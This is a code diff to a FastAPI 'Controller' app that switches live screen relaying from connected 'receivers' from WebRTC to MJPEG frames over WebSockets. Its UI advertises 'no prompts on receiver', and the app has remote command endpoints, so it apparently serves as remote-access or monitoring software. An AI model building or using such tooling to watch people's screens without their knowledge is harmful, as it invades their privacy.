@@ -212,11 +212,6 @@ hub = Hub()
 _screen_viewers: set[WebSocket] = set()
 _screen_viewers_lock = asyncio.Lock()
 
-# WebRTC signaling storage
-_rtc_receiver: Optional[WebSocket] = None
-_rtc_viewers: dict[str, WebSocket] = {}
-_rtc_lock = asyncio.Lock()
-
 # ---------------- FASTAPI ----------------
 app = FastAPI(title="Controller")
 
@@ -376,9 +371,9 @@ CONTROL_HTML = """<!doctype html>
     </div>
     <div class="card">
       <h1>Live Screen</h1>
-      <p style="margin: 4px 0 12px; color:var(--muted);">WebRTC stream; no user prompts on receiver.</p>
+      <p style="margin: 4px 0 12px; color:var(--muted);">Live MJPEG push; no prompts on receiver.</p>
       <div id="screen-wrap">
-        <video id="screen-video" autoplay playsinline muted style="max-width:100%; border:1px solid var(--border); border-radius:10px; background:#0c0817;"></video>
+        <img id="screen-img" src="" alt="Waiting for stream..." style="max-width:100%; border:1px solid var(--border); border-radius:10px; background:#0c0817;">
       </div>
       <div class="row" style="margin-top:10px;">
         <form method="post" action="/ui/live/start">
@@ -437,9 +432,7 @@ CONTROL_HTML = """<!doctype html>
     });
     let selectedReceiver = null;
     let lastReceiverList = [];
-    let rtcWs = null;
-    let rtcPc = null;
-    let rtcViewerId = null;
+    let screenSocket = null;
     const renameForm = document.getElementById('rename-form');
     const renameSelect = document.getElementById('rename-target');
     const renameInput = document.getElementById('rename-alias');
@@ -580,57 +573,28 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
-    function stopWebRtcLive() {
-      if (rtcPc) {
-        rtcPc.getSenders().forEach(s => { try { s.track.stop(); } catch (e) {} });
-        try { rtcPc.close(); } catch (e) {}
-        rtcPc = null;
-      }
-      const video = document.getElementById('screen-video');
-      if (video) video.srcObject = null;
-      if (rtcWs) {
-        try { rtcWs.close(); } catch (e) {}
-        rtcWs = null;
+    function stopScreenSocket() {
+      if (screenSocket) {
+        try { screenSocket.close(); } catch (e) { /* ignore */ }
+        screenSocket = null;
       }
     }
 
-    async function startWebRtcLive() {
-      stopWebRtcLive();
-      rtcViewerId = Math.random().toString(36).slice(2, 10);
+    function connectScreenSocket() {
+      stopScreenSocket();
       const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-      const ws = new WebSocket(proto + '://' + location.host + '/rtc?role=viewer&id=' + rtcViewerId);
-      rtcWs = ws;
-      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      rtcPc = pc;
-      pc.ontrack = (ev) => {
-        const video = document.getElementById('screen-video');
-        if (video && ev.streams[0]) {
-          video.srcObject = ev.streams[0];
-        }
+      const ws = new WebSocket(proto + '://' + location.host + '/screen?role=viewer');
+      ws.binaryType = 'arraybuffer';
+      ws.onmessage = (ev) => {
+        const blob = new Blob([ev.data], { type: 'image/jpeg' });
+        const url = URL.createObjectURL(blob);
+        const img = document.getElementById('screen-img');
+        if (img) img.src = url;
+        setTimeout(() => URL.revokeObjectURL(url), 3000);
       };
-      pc.onicecandidate = (ev) => {
-        if (ev.candidate && ws.readyState === WebSocket.OPEN) {
-          ws.send(JSON.stringify({ type: 'ice', candidate: ev.candidate }));
-        }
-      };
-      ws.onmessage = async (ev) => {
-        try {
-          const msg = JSON.parse(ev.data);
-          if (msg.type === 'answer' && msg.sdp) {
-            await pc.setRemoteDescription(new RTCSessionDescription({ type: msg.sdp_type || 'answer', sdp: msg.sdp }));
-          } else if (msg.type === 'ice' && msg.candidate) {
-            await pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
-          }
-        } catch (e) { /* ignore */ }
-      };
-      ws.onerror = () => { stopWebRtcLive(); };
-      ws.onclose = () => { stopWebRtcLive(); };
-
-      const offer = await pc.createOffer();
-      await pc.setLocalDescription(offer);
-      ws.onopen = () => {
-        ws.send(JSON.stringify({ type: 'offer', sdp: pc.localDescription.sdp, sdp_type: pc.localDescription.type }));
-      };
+      ws.onclose = () => { setTimeout(connectScreenSocket, 1500); };
+      ws.onerror = () => { try { ws.close(); } catch (e) {} };
+      screenSocket = ws;
     }
     async function refreshLogs() {
       try {
@@ -674,10 +638,10 @@ CONTROL_HTML = """<!doctype html>
           refreshReceivers();
         }
         if (form.action.includes('/ui/live/start')) {
-          startWebRtcLive();
+          connectScreenSocket();
         }
         if (form.action.includes('/ui/live/stop')) {
-          stopWebRtcLive();
+          stopScreenSocket();
         }
       });
     }
@@ -693,6 +657,7 @@ CONTROL_HTML = """<!doctype html>
     activateTab('surprise');
     refreshReceivers();
     refreshLogs();
+    connectScreenSocket();
     setInterval(refreshReceivers, 5000);
     setInterval(refreshLogs, 5000);
 
@@ -800,60 +765,34 @@ async def screen_upload(request: Request):
         return JSONResponse({"ok": False, "error": "broadcast failed"}, status_code=500)
     return JSONResponse({"ok": True})
 
-@app.websocket("/rtc")
-async def rtc_ws(ws: WebSocket):
-    role = (ws.query_params.get("role") or "viewer").lower()
-    vid = ws.query_params.get("id") or secrets.token_hex(4)
-    await ws.accept()
-    if role == "receiver":
-        async with _rtc_lock:
-            global _rtc_receiver
-            _rtc_receiver = ws
-        try:
-            while True:
-                raw = await ws.receive_text()
-                try:
-                    data = json.loads(raw)
-                except Exception:
-                    continue
-                target = data.get("target")
-                if target:
-                    async with _rtc_lock:
-                        viewer_ws = _rtc_viewers.get(target)
-                    if viewer_ws:
-                        try:
-                            await viewer_ws.send_text(json.dumps(data))
-                        except Exception:
-                            pass
-        except WebSocketDisconnect:
-            pass
-        finally:
-            async with _rtc_lock:
-                if _rtc_receiver is ws:
-                    _rtc_receiver = None
-    else:
-        async with _rtc_lock:
-            _rtc_viewers[vid] = ws
-        try:
-            while True:
-                raw = await ws.receive_text()
-                try:
-                    data = json.loads(raw)
-                except Exception:
-                    continue
-                data["from"] = vid
-                async with _rtc_lock:
-                    receiver_ws = _rtc_receiver
-                if receiver_ws:
-                    try:
-                        await receiver_ws.send_text(json.dumps(data))
-                    except Exception:
-                        pass
-        except WebSocketDisconnect:
-            pass
-        finally:
-            async with _rtc_lock:
-                _rtc_viewers.pop(vid, None)
+@app.post("/screen/stream")
+async def screen_stream(request: Request):
+    """
+    Accept multipart/x-mixed-replace stream and broadcast each frame to viewers.
+    """
+    raw = await request.body()
+    if not raw:
+        return JSONResponse({"ok": False, "error": "empty body"}, status_code=400)
+    boundary = b"--frame"
+    buf = raw
+    while True:
+        start = buf.find(boundary)
+        if start == -1:
+            break
+        header_end = buf.find(b"\r\n\r\n", start)
+        if header_end == -1:
+            break
+        next_boundary = buf.find(boundary, header_end + 4)
+        if next_boundary == -1:
+            break
+        frame = buf[header_end + 4:next_boundary]
+        if frame:
+            try:
+                await _screen_broadcast(frame)
+            except Exception as e:
+                print("Broadcast error:", e)
+        buf = buf[next_boundary:]
+    return JSONResponse({"ok": True})
 
 
 # ---------------- COMMAND ENDPOINTS ----------------
